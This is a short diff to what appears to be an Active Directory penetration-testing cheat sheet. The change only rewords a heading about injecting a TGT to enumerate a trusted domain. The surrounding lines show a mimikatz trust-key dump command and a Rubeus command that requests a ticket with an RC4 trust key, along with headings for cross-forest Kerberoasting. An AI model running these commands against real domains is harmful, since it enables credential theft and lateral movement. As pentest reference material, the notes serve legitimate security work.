@@ -2111,7 +2111,7 @@ mimikatz lsadump::trust /patch
 .\Rubeus.exe asktgt /user:<FLATNAME>$ /domain:<FQDN DOMAIN> /rc4:<TRUST KEY RC3> /nowrap
 ```
 
-#### Then inject TGT and you can enumerate the other domain
+#### Then inject TGT and you can enumerate the other domain for kerberos vulnerabilities etc.
 
 ### Kerberoast2
 #### Enumerate users with SPN cross-forest
